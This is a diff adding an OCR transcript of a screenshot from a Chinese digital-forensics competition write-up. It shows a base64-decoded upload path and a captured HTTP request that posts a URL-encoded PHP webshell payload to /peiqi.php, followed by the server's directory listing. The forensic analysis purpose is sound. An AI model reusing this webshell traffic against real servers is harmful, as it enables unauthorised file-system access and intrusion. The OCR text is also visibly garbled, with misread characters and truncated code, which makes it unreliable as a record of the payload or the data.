@@ -1,0 +1,60 @@
+# OCR: d352b23ce194abfc7651699371f10259.jpg
+# 来源: ./02-WriteUp/2024/2024-电子取证比武-复盘/d352b23ce194abfc7651699371f10259.jpg
+# 引擎: Umi-OCR 2.1.5 / PaddleOCR (config_chinese, limit_side_len=2880, multi_para)
+# 生成: 2026-11-03 15:15
+
+Recipe
+URL Decode FromBase64 Aiphabet
+A-Za-z0-9+/= Strictmode
+a
+@?
+Removenon-alphabetchars
+Input
+L3d3dy93d3dyb29eL3d3dy50cHNob3AuY29tL3B1YmxpYy91cGxvYwOv
+RIC56
+=1
+Output
+/www/wwwroot/www.tpshop.com/public/upload/
+Wireshark·追踪HTTp流(tcp.streameg1o2)·tcpdump2_tj.cap
+POST /peiqi.php HTTP/1.1 Host:222.2.2.180
+Accept-Encoding:gzip,deflate
+User-Agent:Mozilla/5.@ (Macintosh;U;Intel Mac 0s X 1e 6 6;zh-cn) ApplewebKit/533.2.25 (KHTML,1ike Gecko) Versi Content-Type:application/x-www-form-urlencoded
+Content-Length:1582 Connection: close
+dbfca74ace7b02=j9L3d3dy93d3dyb290L3d3dy50cHNob3AuY29tL3B1YmxpYy91cGxvYwOv&peiqi=%40iniset(%22displayerrors%22%2C%2 penbasedir%22)%3Bif（%24opdir）%20%7B%24oparr%3Dpregsp1it（%22%2F%5C%5C%5C%5C%7C%5C%2F%2F%22%2C%24opdir）%3B%24ocwd%3D 22.41427e26%22%3B%40mkdir（%24tmdir)%3B%40chdir(%24tmdir)%3B%40iniset(%22openbasedir%22%2c%22..%22)%3Bfor（%24i%3D0% 3B%7D%40iniset（%22openbasedir%22%2c%22%2F%22)%3B%40rmdir（%24ocwd.%22%2F%22.%24tmdir)%3B%7D%3Bfunction%20asenc（%24o ut%3Dobgetcontents()%3Bobendc1ean()%3Becho%20%22fd%22.%223f5%22%3Becho%20%40asenc(%24output)%3Becho%20%2211af5%2 bstr（%24P0ST%5B%22dbfca74ace7b02%22%5D%2C2））%3B%24F%3D%40opendir（%24D）%3Bif（%24F%3D%3DNULL）%7Becho（%22ERROR%3A%2F%2 7B%24M%3DNULL%3B%24L%3DNULL%3Bwhi1e（%24N%3D%40readdir（%24F））%7B%24P%3D%24D.%24N%3B%24T%3D%40date（%22Y-m-d%20H%3Ai%3A 0fi1eperms（%24P）%2C10%2C8）)%2C-4)%3B%24R%3D%22%09%22.%24T.%22%09%22.%40fi1esize（%24P）.%22%09%22.%24E.%22%0A%22%3Bif（% 24N.%24R%3B%7Decho%20%24M.%24L%3B%40c1osedir（%24F）)%3B%7D%3B%7Dcatch（Exception%20%24e)%7Becho%20%22ERR0R%3A%2F%2F%22. QoK
+Server:nginx
+Date:Fri,04Mar202210:22:42GMT
+Content-Type:text/html:charset=UTF-8
+Transfer-Encoding: chunked Connection: close
+Vary:Accept-Encoding Content-Encoding:gzip
+fd3f5./ activity/ ad/
+banner/ brand/
+categoryi comment/
+goods/ head pic/ plugins/
+2022-03-04 18:22:38 2020-09-09 16:43:46 2020-09-09
+15:39:00
+2020-09-09 15:39:02
+15:39:04
+2020-09-09
+15:39:04
+2020-09-09
+2020-09-09 15:39:12 2020-09-09
+15:3916
+2020-09-09
+15:39:16
+2020-09-09
+15:40:32
+2020-09-09
+15:40:32
+return goods/
+weixin/
+192 183 18 30 18 18 18 66 31 18 18
+2020-09-0915:40:32
+15:40:32
+2020-09-09
+lencrypt file.exe 11af547a38
+18
+2022-03-04 18:22:42
+0755 0755 0755 0755 0755 0755 0755 8755 0755 0755 0755
+54 8755
+9754698
+0755 0644
